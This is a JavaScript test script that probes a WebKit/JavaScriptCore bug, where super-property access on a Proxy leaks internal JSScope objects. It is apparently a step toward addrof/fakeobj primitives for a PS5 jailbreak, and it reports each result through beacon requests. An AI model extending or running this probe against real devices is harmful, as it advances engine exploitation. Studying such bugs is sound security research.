// p360 - ProxyObject get_by_id_with_this JSScope leak test
//
// Bug: super.property compiles to get_by_id_with_this. When base is a Proxy,
// the get trap receives raw this (JSScope) as receiver without toThis() sanitization.
// LLIntSlowPaths.cpp:740-749 has zero toThis() calls.
// Jordy used this for addrof/fakeobj on PS5 13.60.
// ufm42 says patched since 14.00 but source lacks fix -> device test needed.
//
// Beacon prefix: V360-

(function() {
  var BQ = 0;
  function B(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', '/beacon/V360-' + tag + '?t=' + Date.now() + '&q=' + (BQ++), false);
      x.send('');
    } catch(e) {
      try { new Image().src = '/beacon/V360-' + tag + '?t=' + Date.now(); } catch(e2) {}
    }
  }

  B('BOOT');

  // Test 1: Basic JSScope leak via Proxy get trap
  try {
    var leaked1 = null;
    var handler1 = {
      get: function(target, prop, receiver) {
        leaked1 = receiver;
        return Reflect.get(target, prop, receiver);
      }
    };
    var P1 = new Proxy(function(){}, handler1);
    // Use class extends to make super.x trigger get_by_id_with_this
    var C1 = (new Function('P', 'return class extends P { m() { return super.toString; } }'))(P1);
    try {
      new C1().m();
    } catch(e) {
      B('T1-CALL-ERR-' + String(e).substring(0, 40));
    }

    if (leaked1 === null || leaked1 === undefined) {
      B('T1-PATCHED-NULL');
    } else {
      var t = typeof leaked1;
      B('T1-TYPE-' + t);
      var ctor = '';
      try { ctor = leaked1.constructor ? leaked1.constructor.name : 'none'; } catch(e) { ctor = 'err'; }
      B('T1-CTOR-' + ctor);
      var str = '';
      try { str = String(leaked1).substring(0, 60); } catch(e) { str = 'ERR-' + String(e).substring(0, 40); }
      B('T1-STR-' + str);

      // Check if it's a JSScope (internal object) vs normal instance
      var isInstance = (leaked1 instanceof C1);
      B('T1-INSTANCEOF-' + isInstance);

      // Try to enumerate properties
      var keys = [];
      try {
        for (var k in leaked1) {
          keys.push(k);
          if (keys.length > 10) break;
        }
      } catch(e) { keys.push('ENUM-ERR'); }
      B('T1-KEYS-' + (keys.length > 0 ? keys.join(',') : 'none'));

      // Try Object.getOwnPropertyNames
      var ownKeys = [];
      try {
        ownKeys = Object.getOwnPropertyNames(leaked1).slice(0, 15);
      } catch(e) { ownKeys = ['ERR']; }
      B('T1-OWNKEYS-' + ownKeys.join(','));

      // Check for scope chain properties
      try { B('T1-HAS-__scope-' + ('__scope__' in leaked1)); } catch(e) {}
      try { B('T1-PROTO-' + String(Object.getPrototypeOf(leaked1)).substring(0, 40)); } catch(e) { B('T1-PROTO-ERR'); }
    }
  } catch(e) {
    B('T1-ERR-' + String(e).substring(0, 60));
  }

  // Test 2: Alternative trigger using eval class syntax
  try {
    var leaked2 = null;
    var handler2 = {
      get: function(target, prop, receiver) {
        leaked2 = receiver;
        return Reflect.get(target, prop, receiver);
      }
    };
    var Base2 = new Proxy(class {}, handler2);
    var code = '(class extends Base2 { test() { return super.valueOf; } })';
    var C2;
    try {
      C2 = eval(code);
    } catch(e) {
      // Fallback: build class differently
      C2 = (new Function('Base2', 'return class extends Base2 { test() { return super.valueOf; } }'))(Base2);
    }
    try {
      new C2().test();
    } catch(e) {
      B('T2-CALL-ERR-' + String(e).substring(0, 40));
    }

    if (leaked2 === null || leaked2 === undefined) {
      B('T2-PATCHED');
    } else {
      var t2 = typeof leaked2;
      B('T2-TYPE-' + t2);
      var isScope = false;
      try {
        // JSScope objects have special behavior: toString returns "[object JSScope]" or similar
        var s = Object.prototype.toString.call(leaked2);
        B('T2-TOSTRING-' + s.substring(0, 40));
        if (s.indexOf('Scope') >= 0 || s.indexOf('Activation') >= 0 || s.indexOf('Global') >= 0) {
          isScope = true;
        }
      } catch(e) { B('T2-TOSTRING-ERR'); }

      if (isScope || t2 === 'object') {
        B('T2-SCOPE-LEAK-CONFIRMED');
        // Try to read scope chain entries
        try {
          var proto = leaked2;
          var depth = 0;
          while (proto && depth < 5) {
            B('T2-CHAIN-' + depth + '-' + Object.prototype.toString.call(proto).substring(0, 40));
            proto = Object.getPrototypeOf(proto);
            depth++;
          }
        } catch(e) { B('T2-CHAIN-ERR-' + String(e).substring(0, 30)); }
      }
    }
  } catch(e) {
    B('T2-ERR-' + String(e).substring(0, 60));
  }

  // Test 3: Proxy on object with Symbol.toPrimitive for addrof potential
  try {
    var leaked3 = null;
    var handler3 = {
      get: function(target, prop, receiver) {
        if (prop === Symbol.toPrimitive || prop === 'valueOf' || prop === 'toString') {
          // Don't intercept conversion methods
          return Reflect.get(target, prop, receiver);
        }
        leaked3 = receiver;
        return Reflect.get(target, prop, receiver);
      }
    };
    var Base3 = new Proxy(class {}, handler3);
    var C3 = (new Function('Base3', 'return class extends Base3 { go() { return super.constructor; } }'))(Base3);
    try {
      new C3().go();
    } catch(e) {
      B('T3-CALL-ERR-' + String(e).substring(0, 40));
    }

    if (leaked3 !== null && leaked3 !== undefined) {
      B('T3-LEAKED-TYPE-' + typeof leaked3);
      // Try to detect JSCell header by examining the object
      try {
        // If we have a JSScope, we can try to build addrof
        // by storing it in a known structure
        var arr = [1.1, 2.2, 3.3];
        arr[0] = leaked3;
        // Read back as float to get the address bits
        var view = new Float64Array(1);
        var buf = new ArrayBuffer(8);
        var f64 = new Float64Array(buf);
        var u8 = new Uint8Array(buf);

        // If we can get addrof by reading the array element as a float
        // (only works if we can create a type confusion)
        B('T3-ARRAY-SET-OK');
        B('T3-ARR0-TYPE-' + typeof arr[0]);
      } catch(e) {
        B('T3-ERR-' + String(e).substring(0, 40));
      }
    } else {
      B('T3-PATCHED');
    }
  } catch(e) {
    B('T3-ERR-' + String(e).substring(0, 60));
  }

  // Test 4: Direct LLInt slow path via with statement + Proxy
  try {
    var leaked4 = null;
    var obj4 = { x: 42 };
    var proxy4 = new Proxy(obj4, {
      get: function(target, prop, receiver) {
        leaked4 = receiver;
        return target[prop];
      }
    });

    // with() creates a scope chain entry
    with (proxy4) {
      void x;
    }

    if (leaked4 !== null && leaked4 !== undefined) {
      B('T4-WITH-LEAKED-' + typeof leaked4);
      B('T4-WITH-TOSTR-' + Object.prototype.toString.call(leaked4).substring(0, 40));
    } else {
      B('T4-WITH-NORECV');
    }
  } catch(e) {
    B('T4-ERR-' + String(e).substring(0, 60));
  }

  B('DONE');
})();
